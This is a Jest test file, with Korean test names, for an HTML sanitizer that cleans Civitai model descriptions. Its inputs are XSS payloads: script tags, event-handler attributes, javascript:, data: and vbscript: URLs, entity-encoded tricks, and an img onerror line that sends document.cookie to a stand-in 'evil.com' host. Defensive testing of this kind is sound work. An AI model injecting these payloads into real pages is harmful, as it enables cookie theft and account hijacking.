import { sanitizeHtml } from './sanitizeHtml';

describe('sanitizeHtml — 기본 동작', () => {
  test('null/undefined/빈 문자열은 빈 문자열 반환', () => {
    expect(sanitizeHtml(null)).toBe('');
    expect(sanitizeHtml(undefined)).toBe('');
    expect(sanitizeHtml('')).toBe('');
  });

  test('일반 텍스트는 그대로 반환', () => {
    expect(sanitizeHtml('Hello World')).toBe('Hello World');
  });

  test('HTML 엔티티가 포함된 텍스트 보존', () => {
    expect(sanitizeHtml('A &amp; B &lt; C')).toBe('A &amp; B &lt; C');
  });
});

describe('sanitizeHtml — 허용 태그 보존', () => {
  test('서식 태그(p, strong, em, b, i, u) 보존', () => {
    const html = '<p>Hello <strong>bold</strong> <em>italic</em> <b>b</b> <i>i</i> <u>underline</u></p>';
    expect(sanitizeHtml(html)).toBe(html);
  });

  test('리스트 태그(ul, ol, li) 보존', () => {
    const html = '<ul><li>Item 1</li><li>Item 2</li></ul>';
    expect(sanitizeHtml(html)).toBe(html);
  });

  test('헤딩 태그(h1~h6) 보존', () => {
    const html = '<h1>Title</h1><h3>Subtitle</h3><h6>Small</h6>';
    expect(sanitizeHtml(html)).toBe(html);
  });

  test('코드 블록(pre, code) 보존', () => {
    const html = '<pre><code>const x = 1;</code></pre>';
    expect(sanitizeHtml(html)).toBe(html);
  });

  test('blockquote, hr, br, span, div 보존', () => {
    const html = '<blockquote>Quote</blockquote><hr><br><span>text</span><div>div</div>';
    expect(sanitizeHtml(html)).toBe(html);
  });

  test('링크(a) 태그의 href, target, rel 속성 보존', () => {
    const html = '<a href="https://civitai.com" target="_blank" rel="noopener noreferrer">Link</a>';
    expect(sanitizeHtml(html)).toBe(html);
  });
});

describe('sanitizeHtml — XSS 공격 벡터 차단', () => {
  test('script 태그 제거', () => {
    const html = '<p>Hello</p><script>alert("xss")</script>';
    expect(sanitizeHtml(html)).toBe('<p>Hello</p>');
  });

  test('script 태그 변형(대소문자 혼합) 제거', () => {
    const html = '<p>Text</p><ScRiPt>alert(1)</ScRiPt>';
    expect(sanitizeHtml(html)).toBe('<p>Text</p>');
  });

  test('iframe 태그 제거', () => {
    const html = '<p>Content</p><iframe src="https://evil.com"></iframe>';
    expect(sanitizeHtml(html)).toBe('<p>Content</p>');
  });

  test('img 태그 제거 (onerror XSS 방지)', () => {
    expect(sanitizeHtml('<img src="x" onerror="alert(1)">')).toBe('');
    expect(sanitizeHtml('<img src="valid.jpg">')).toBe('');
  });

  test('object/embed 태그 제거', () => {
    expect(sanitizeHtml('<object data="evil.swf"></object>')).toBe('');
    expect(sanitizeHtml('<embed src="evil.swf">')).toBe('');
  });

  test('form/input 태그 제거', () => {
    const html = '<form action="https://evil.com"><input type="text"></form>';
    expect(sanitizeHtml(html)).toBe('');
  });

  test('style 태그 제거', () => {
    const html = '<style>body{display:none}</style><p>Text</p>';
    expect(sanitizeHtml(html)).toBe('<p>Text</p>');
  });

  test('svg 태그 제거 (onload XSS 방지)', () => {
    const html = '<svg onload="alert(1)"><circle r="10"></circle></svg>';
    expect(sanitizeHtml(html)).not.toContain('svg');
    expect(sanitizeHtml(html)).not.toContain('onload');
  });

  test('math 태그 제거', () => {
    expect(sanitizeHtml('<math><mi>x</mi></math>')).not.toContain('math');
  });
});

describe('sanitizeHtml — 속성 기반 XSS 차단', () => {
  test('이벤트 핸들러 속성(onclick, onmouseover 등) 제거', () => {
    expect(sanitizeHtml('<div onclick="alert(1)">Click</div>')).toBe('<div>Click</div>');
    expect(sanitizeHtml('<p onmouseover="alert(1)">Hover</p>')).toBe('<p>Hover</p>');
    expect(sanitizeHtml('<span onload="alert(1)">Text</span>')).toBe('<span>Text</span>');
  });

  test('링크의 비허용 속성 제거 (onclick 등)', () => {
    const html = '<a href="https://example.com" onclick="alert(1)" style="color:red">Link</a>';
    expect(sanitizeHtml(html)).toBe('<a href="https://example.com">Link</a>');
  });

  test('data-* 속성 제거', () => {
    expect(sanitizeHtml('<span data-payload="malicious">Text</span>')).toBe('<span>Text</span>');
    expect(sanitizeHtml('<div data-x="1" data-y="2">Content</div>')).toBe('<div>Content</div>');
  });

  test('style 속성 제거', () => {
    expect(sanitizeHtml('<p style="background:url(javascript:alert(1))">Text</p>')).toBe('<p>Text</p>');
  });

  test('class/id 속성 제거', () => {
    expect(sanitizeHtml('<div class="evil" id="target">Text</div>')).toBe('<div>Text</div>');
  });
});

describe('sanitizeHtml — 프로토콜 기반 XSS 차단', () => {
  test('javascript: 프로토콜 href 제거', () => {
    const result = sanitizeHtml('<a href="javascript:alert(1)">Click</a>');
    expect(result).not.toContain('javascript:');
  });

  test('data: 프로토콜 href 제거', () => {
    const result = sanitizeHtml('<a href="data:text/html,<script>alert(1)</script>">Click</a>');
    expect(result).not.toContain('data:');
  });

  test('vbscript: 프로토콜 href 제거', () => {
    const result = sanitizeHtml('<a href="vbscript:alert(1)">Click</a>');
    expect(result).not.toContain('vbscript:');
  });

  test('정상 https/http 링크는 보존', () => {
    const html = '<a href="https://civitai.com/models/12345">Model</a>';
    expect(sanitizeHtml(html)).toBe(html);
  });
});

describe('sanitizeHtml — Civitai description 실제 패턴', () => {
  test('일반적인 Civitai 모델 설명 HTML 보존', () => {
    const html = '<p>This is a <strong>LoRA model</strong> trained on <em>anime</em> style images.</p><ul><li>Base: SDXL</li><li>Steps: 2000</li></ul>';
    expect(sanitizeHtml(html)).toBe(html);
  });

  test('Civitai 설명에 포함된 외부 링크 보존', () => {
    const html = '<p>Check out my <a href="https://civitai.com/user/creator" target="_blank">profile</a> for more.</p>';
    expect(sanitizeHtml(html)).toBe(html);
  });

  test('악성 description — 스크립트 삽입 시도 차단', () => {
    const malicious = '<p>Nice model</p><script>document.cookie</script><p>More info</p>';
    expect(sanitizeHtml(malicious)).toBe('<p>Nice model</p><p>More info</p>');
  });

  test('악성 description — img onerror 삽입 시도 차단', () => {
    const malicious = '<p>Description</p><img src=x onerror="fetch(\'https://evil.com/steal?\'+document.cookie)">';
    const result = sanitizeHtml(malicious);
    expect(result).toBe('<p>Description</p>');
    expect(result).not.toContain('onerror');
    expect(result).not.toContain('fetch');
  });

  test('악성 description — 중첩 인코딩 시도 차단', () => {
    const malicious = '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">Click</a>';
    const result = sanitizeHtml(malicious);
    expect(result).not.toContain('javascript');
  });

  test('.substring(0, 500)과 조합 시 잘린 태그 안전 처리', () => {
    // 500자에서 잘렸을 때 불완전한 태그가 남는 경우
    const longHtml = '<p>' + 'A'.repeat(490) + '</p><script>alert(1)</script>';
    const truncated = longHtml.substring(0, 500);
    const result = sanitizeHtml(truncated);
    expect(result).not.toContain('script');
    expect(result).not.toContain('alert');
  });
});
